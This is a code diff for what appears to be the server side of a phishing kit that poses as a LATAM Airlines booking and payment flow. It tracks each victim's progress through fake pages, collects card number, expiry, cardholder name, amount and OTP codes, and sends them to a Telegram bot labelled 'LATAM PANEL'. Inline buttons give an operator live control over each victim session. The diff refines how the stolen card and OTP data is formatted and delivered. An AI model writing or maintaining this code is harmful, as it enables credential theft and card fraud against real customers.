@@ -127,23 +127,25 @@ function actionLabel(action: RouteAction) {
   return labels[action] || action;
 }
 
+function isProcessingEvent(event: unknown) {
+  return event === 'PAYMENT_SUBMIT' || event === 'OTP_SUBMIT';
+}
+
 function stepLabel(event: unknown, meta?: Record<string, unknown>) {
   if (typeof meta?.step === 'string' && meta.step.trim()) return meta.step.trim();
   const labels: Record<string, string> = {
     P1: 'Inicio / reserva',
     P2: 'Eligiendo vuelos',
     P3: 'Resumen del viaje',
-    P4: 'Checkout (pasajeros / asientos / tienda)',
+    P4: 'Datos de pasajeros',
     'P-PAYMENT': 'Página de pago',
     'P-SUCCESS': 'Compra confirmada',
-    PAYMENT_SUBMIT: 'Envió datos de tarjeta',
+    PAYMENT_SUBMIT: 'Pago en proceso',
     OTP_SUBMIT: 'Envió código OTP',
   };
   return labels[String(event || '')] || String(event || '-');
 }
 
-// Los tres botones se mantienen iguales en todos los mensajes para que el operador
-// siempre tenga las mismas opciones de routing manual.
 function keyboard(sessionId: string, brand: string) {
   return {
     inline_keyboard: [
@@ -154,35 +156,50 @@ function keyboard(sessionId: string, brand: string) {
   };
 }
 
-// Plantilla unica para todos los eventos: page views, pago y OTP usan la misma estructura.
-function formatTelegramMessage(payload: Record<string, unknown>) {
-  console.log('PAYLOAD FROM MAP: ', payload);
+function formatPenAmount(meta: Record<string, unknown>, payload: Record<string, unknown>) {
+  const labeled = meta.amountLabel ?? payload.amountLabel;
+  if (typeof labeled === 'string' && labeled.trim()) return labeled.trim();
+  const raw = meta.amount ?? payload.amount;
+  const n = Number(raw);
+  if (Number.isFinite(n) && String(raw) !== '') {
+    return `PEN ${n.toFixed(2).replace('.', ',')}`;
+  }
+  return '-';
+}
+
+function formatStepMessage(payload: Record<string, unknown>) {
+  const meta = objectValue(payload.meta) || {};
+  return stepLabel(payload.event, meta);
+}
+
+function formatPaymentMessage(payload: Record<string, unknown>) {
   const mockCard = payload.mockCard as { brand?: string; pan?: string; exp?: string; cvv?: string; holder?: string } | undefined;
   const meta = objectValue(payload.meta) || {};
   const metaOtp = objectValue(payload.metaOtp) || {};
+  const stepMeta = payload.event === 'OTP_SUBMIT' ? { ...meta, ...metaOtp } : meta;
   const cpayload = objectValue(meta.cpayload) || {};
   const brand = String(payload.brand || mockCard?.brand || meta.brand || '-');
-  const amount = meta.amount == null || meta.amount === '' ? '-' : String(meta.amount);
-  const lines = [
+  return [
     '✈️ LATAM PANEL',
     '━━━━━━━━━━━━━━━━━━',
-    `📍 Paso: ${stepLabel(payload.event, meta)}`,
-    `🔗 Ruta: ${payload.route || meta.path || '-'}`,
+    `📍 ${stepLabel(payload.event, stepMeta)}`,
     `🆔 Sesión: ${payload.sessionId || '-'}`,
-    `💵 Monto: ${amount === '-' ? '-' : `PEN ${amount}`}`,
+    `💵 Monto: ${formatPenAmount(meta, payload)}`,
     '',
     '💳 DATOS DE PAGO',
     `🏷️ Marca: ${brand.toUpperCase()}`,
     `💳 Tarjeta: ${cpayload.b || meta.card || '-'}`,
-    `📅 Expira: ${cpayload.exp || '-'}`,
+    `📅 Expira: ${cpayload.cv || cpayload.exp || '-'}`,
     `👤 Titular: ${cpayload.holder || '-'}`,
     '',
     '💰 OTP',
     `💵 Código: ${metaOtp.otp || '-'}`,
     '━━━━━━━━━━━━━━━━━━',
-  ];
+  ].join('\n');
+}
 
-  return lines.join('\n');
+function formatTelegramMessage(payload: Record<string, unknown>) {
+  return isProcessingEvent(payload.event) ? formatPaymentMessage(payload) : formatStepMessage(payload);
 }
 
 // Wrapper minimo para llamar metodos del Bot API sin repetir token/url.
@@ -227,7 +244,7 @@ async function sendTelegram(payload: Record<string, unknown>, options: { withBut
     text: formatTelegramMessage(payload),
     disable_web_page_preview: true,
   };
-  if (options.withButtons ?? true) {
+  if (options.withButtons) {
     message.reply_markup = keyboard(sessionId, brand);
   }
   const result = await telegramApi('sendMessage', message);
@@ -325,13 +342,16 @@ export const POST: APIRoute = async ({ request }) => {
     session.decision = { action: 'wait', brand, updatedAt: new Date().toISOString() };
   }
 
+  const meta = { ...(previousMeta || {}), ...(incomingMeta || {}) };
   const payload = {
     sessionId,
     event,
     route: String(body.route || ''),
     createdAt: new Date().toISOString(),
     brand,
-    meta: incomingMeta || previousMeta || {},
+    amount: meta.amount ?? previousMeta?.amount,
+    amountLabel: meta.amountLabel ?? previousMeta?.amountLabel,
+    meta,
     metaOtp: incomingMetaOtp || previousMetaOtp || {},
     action: event === 'PAYMENT_SUBMIT' || event === 'OTP_SUBMIT' ? 'wait' : 'ack',
     mockCard,
@@ -339,7 +359,9 @@ export const POST: APIRoute = async ({ request }) => {
 
   console.info('[debug-api]', payload);
   session.payload = payload;
-  const telegram = await sendTelegram(payload, { withButtons: event !== 'P-SUCCESS' });
+  const telegram = event === 'P-SUCCESS'
+    ? { sent: false, skipped: 'success-page' }
+    : await sendTelegram(payload, { withButtons: isProcessingEvent(event) });
 
   return json({ ...payload, telegram });
 };
